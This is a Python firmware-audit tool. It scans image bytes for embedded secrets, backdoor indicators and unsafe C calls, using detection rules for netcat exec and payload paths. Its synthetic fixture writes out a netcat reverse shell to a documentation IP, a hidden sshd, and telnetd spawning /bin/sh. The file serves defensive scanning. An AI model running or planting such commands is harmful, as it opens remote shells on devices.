#!/usr/bin/env python3
"""
F6 — Firmware / image audit.

Extracts ASCII strings, config artifacts, file paths, and dangerous-function
references from firmware-image byte buffers (any format: raw .bin, .img,
U-Boot/ELF-ish chunks), flags embedded secrets, backdoor paths and dangerous
functions across supported image formats, and produces an audit report.

Scans synthetic fixture bytes only (RFC 5737 addresses, doc.example.com names,
fictional package names). Fully offline and deterministic - stdlib only.
"""

from __future__ import annotations

import argparse
import binascii
import hashlib
import json
import re
import sys
from pathlib import Path

# --------------------------------------------------------------------------- #
# Detection rule sets.
# --------------------------------------------------------------------------- #
SECRET_PATTERNS = [
    (re.compile(r"(?i)(api[_-]?key|secret|token)\s*[=:]\s*([A-Za-z0-9_\-]{8,})"),
     "embedded-credential"),
    (re.compile(r"password\s*[=:]\s*(\S+)"), "embedded-password"),
    (re.compile(r"AKIA[0-9A-Z]{16}"), "aws-access-key"),
    (re.compile(r"BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY"), "private-key"),
    (re.compile(r"(?i)db_pass\s*[=:]\s*\S+"), "db-password"),
]

BACKDOOR_PATTERNS = [
    (re.compile(r"(?i)(/usr/sbin/sshd|/bin/sh)\s+-p"), "alternate-shell-port"),
    (re.compile(r"nc\s+-e"), "netcat-exec"),
    (re.compile(r"(?i)(/tmp/|/dev/shm/)\.?[a-z_]+\.(sh|py|pl|so)\b"),
     "temp-payload-path"),
    (re.compile(r"(?i)(autorun|telnetd|dropbear)\b"), "service-trojan"),
    (re.compile(r"(?i)eval\s*\(\s*['\"]base64"), "eval-base64"),
    (re.compile(r"(?i)(iptables\s+-F|flush\s+rules)"), "rule-flush"),
]

DANGEROUS_FUNCTIONS = [
    (re.compile(r"\b(strcpy|strcat|sprintf|vsprintf|gets)\s*\("), "memory-unsafe"),
    (re.compile(r"\b(system|popen|execl|execve|dlopen)\s*\("), "process-exec"),
    (re.compile(r"\b(memcpy|memmove|strncpy)\s*\([^,]+,\s*[^,]+,\s*[^)]*sizeof"),
     "possible-bounded-copy"),
]

# --------------------------------------------------------------------------- #
# Firmware scanning core.
# --------------------------------------------------------------------------- #
class FirmwareImage:
    """Wrap a bytes buffer as a scanable firmware image."""

    def __init__(self, data: bytes, name: str = "image.bin", fmt: str = "raw"):
        self.data = data
        self.name = name
        self.fmt = fmt

    def strings(self, min_len=4):
        """Extract printable ASCII strings (evidence for paths/secrets/fns)."""
        return re.findall(rb"[\x20-\x7e]{%d,}" % min_len, self.data)

    def scan_secrets(self):
        findings = []
        for raw in self.strings():
            s = raw.decode("latin-1")
            for pattern, label in SECRET_PATTERNS:
                for m in pattern.finditer(s):
                    findings.append({"kind": label, "evidence": m.group(0)[:64]})
        return _dedup(findings)

    def scan_backdoors(self):
        findings = []
        for raw in self.strings():
            s = raw.decode("latin-1")
            for pattern, label in BACKDOOR_PATTERNS:
                for m in pattern.finditer(s):
                    findings.append({"kind": label, "evidence": m.group(0)[:64]})
        return _dedup(findings)

    def scan_dangerous(self):
        findings = []
        for raw in self.strings():
            s = raw.decode("latin-1")
            for pattern, label in DANGEROUS_FUNCTIONS:
                for m in pattern.finditer(s):
                    findings.append({"kind": label, "evidence": m.group(0)[:64]})
        return _dedup(findings)

    def config_paths(self):
        """Extract config-like paths from the strings."""
        out = set()
        for raw in self.strings():
            s = raw.decode("latin-1")
            for p in re.findall(r"(/\w[\w/\-\.]*)", s):
                base = p.split("/")[-1]
                if (len(p) > 4 and dotless(base)) or ext_match(base):
                    out.add(p)
        return sorted(out)

    def sha256(self):
        return hashlib.sha256(self.data).hexdigest()


def _dedup(items):
    seen = set()
    out = []
    for it in items:
        key = (it["kind"], it["evidence"])
        if key not in seen:
            seen.add(key)
            out.append(it)
    return out


def dotless(name):
    return "." not in name and len(name) > 0


def ext_match(name):
    return name.endswith((".conf", ".cfg", ".json", ".ini", ".sh"))


# --------------------------------------------------------------------------- #
# Formats / builder.
# --------------------------------------------------------------------------- #
def sniff_format(data: bytes, name: str):
    if data[:2] == b"MZ":
        return "pe"
    if data[:4] == b"\x7fELF":
        return "elf"
    if data[:8] == b"\x89PNG\r\n\x1a\n":
        return "png"
    if data[:8] == b"U-Boot":
        return "uboot"
    if name.endswith((".bin", ".img", ".fw")) or b"\x00" in data[:64]:
        return "raw"
    return "unknown"


def build_fixture(name="router.bin"):
    """Synthetic firmware image carrying secret/backdoor/dangerous evidence."""
    config_blob = (
        b"# known-good default config\n"
        b"[network]\n"
        b"hostname = router.example.com\n"
        b"mtu = 1500\n"
        b"listen_addr = 192.0.2.10\n"
        b"[admin]\n"
        b"api_key = AHg3zKsO8fNQeXplt4u\n"
        b"password = s3cr3t-router\n\n"
    )
    backdoor_blob = (
        b"# post-install hooks\n"
        b"/usr/sbin/sshd -p 2222 > /dev/null 2>&1 &\n"
        b"nc -e /bin/sh 198.51.100.55 4444 &\n"
        b"sh /tmp/.r.sh\n"
        b"echo AWSREDACTED_EXAMPLE >> /var/log/leak\n\n"
    )
    code_blob = (
        b"char buf[64];\n"
        b"strcpy(buf, input);\n"
        b"system(\"telnetd -l /bin/sh\");\n"
        b"eval(base64_decode('ZWNobyBoaQ=='));\n\n"
    )
    safe_blob = (
        b"stat(); makedev(); mount(); header_trailer; done.\n"
    )
    data = config_blob + backdoor_blob + code_blob + safe_blob + bytes(1024)
    return FirmwareImage(data, name=name, fmt=sniff_format(data, name))


# --------------------------------------------------------------------------- #
# Risk rollup.
# --------------------------------------------------------------------------- #
def score_image(image):
    sev = {
        "embedded-credential": 3, "embedded-password": 4,
        "aws-access-key": 3, "private-key": 5, "db-password": 4,
        "alternate-shell-port": 4, "netcat-exec": 5, "temp-payload-path": 4,
        "service-trojan": 3, "eval-base64": 4, "rule-flush": 3,
        "memory-unsafe": 3, "process-exec": 3, "possible-bounded-copy": 0,
    }
    findings = (image.scan_secrets() + image.scan_backdoors()
                + image.scan_dangerous())
    total = sum(sev.get(f["kind"], 0) for f in findings)
    return {"image": image.name, "fmt": image.fmt,
            "sha256": image.sha256(), "size": len(image.data),
            "findings": findings, "risk_score": total,
            "config_paths": image.config_paths()}


# --------------------------------------------------------------------------- #
# CLI.
# --------------------------------------------------------------------------- #
def main(argv=None):
    ap = argparse.ArgumentParser(
        prog="f6-firmware-audit",
        description="Firmware/image audit: extract strings, configs, paths; "
                    "flag secrets, backdoored paths and dangerous functions.",
    )
    ap.add_argument("--image", default=None, nargs="*",
                    help="paths to firmware images to audit; default: synthetic "
                         "fixture")
    ap.add_argument("--config", default="config.json")
    ap.add_argument("--report", default="reports/report.md")
    ap.add_argument("--strict", action="store_true",
                    help="exit 1 when risk is present (gate mode)")
    ap.add_argument("--verbose", "-v", action="store_true")
    args = ap.parse_args(argv)

    cfg = {}
    cfg_path = Path(args.config)
    if cfg_path.exists():
        try:
            cfg = json.loads(cfg_path.read_text())
        except json.JSONDecodeError:
            print("[config] parse error in %s" % cfg_path, file=sys.stderr)
            return 2

    images = []
    if args.image:
        for path in args.image:
            data = Path(path).read_bytes()
            images.append(FirmwareImage(data, name=Path(path).name,
                                        fmt=sniff_format(data, Path(path).name)))
    else:
        images = [build_fixture()]

    reports = [score_image(img) for img in images]

    banner = "=" * 62 + "\n  F6 - FIRMWARE / IMAGE AUDIT\n" + "=" * 62
    lines = [banner]
    for rep in reports:
        lines.append("")
        lines.append("  image : %s  (fmt=%s, %d bytes, sha256=%s...)" %
                     (rep["image"], rep["fmt"], rep["size"], rep["sha256"][:16]))
        lines.append("  risk  : %d" % rep["risk_score"])
        lines.append("  findings:")
        for f in rep["findings"]:
            lines.append("    [%-22s] %s" % (f["kind"], f["evidence"]))
        if rep["config_paths"]:
            lines.append("  config paths:")
            for p in rep["config_paths"][:10]:
                lines.append("    %s" % p)
    text = "\n".join(lines)

    out = Path(args.report)
    out.parent.mkdir(parents=True, exist_ok=True)
    if args.report.endswith(".json"):
        out.write_text(json.dumps(reports, indent=2))
    else:
        out.write_text(text)
    print(text)

    # 0 = successful run, 1 = risk present (--strict only), 2 = config error.
    return 1 if (max(r["risk_score"] for r in reports) > 0 and args.strict) else 0


if __name__ == "__main__":
    sys.exit(main())